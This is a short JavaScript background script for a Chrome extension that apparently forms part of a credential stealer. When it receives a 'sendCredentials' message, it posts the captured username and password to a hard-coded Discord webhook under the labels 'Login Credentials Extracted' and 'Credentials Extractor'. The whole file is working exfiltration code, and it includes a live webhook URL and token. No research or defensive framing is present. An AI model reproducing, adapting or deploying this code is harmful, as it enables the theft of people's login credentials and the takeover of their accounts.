const WEBHOOK_URL = "https://discord.com/api/webhooks/1224754750411640872/HE3Bjo2CDj89NzCdsp5b9mLWZlt8HBs9SAg6mhGNBcHeqYZ8s9d-31LQ2c2Mr_TTHQsL"; 

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action === "sendCredentials") {
        sendCredentialsToWebhook(message.credentials.username, message.credentials.password);
    }
});

function sendCredentialsToWebhook(username, password) {
    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            "content": "Login Credentials Extracted",
            "embeds": [
                {
                    "title": "Credentials",
                    "description": `**Username:** ${username}\n**Password:** ${password}`,
                    "color": null,
                }
            ],
            "username": "Credentials Extractor",
            "avatar_url": "",
            "attachments": []
        }),
    });
}
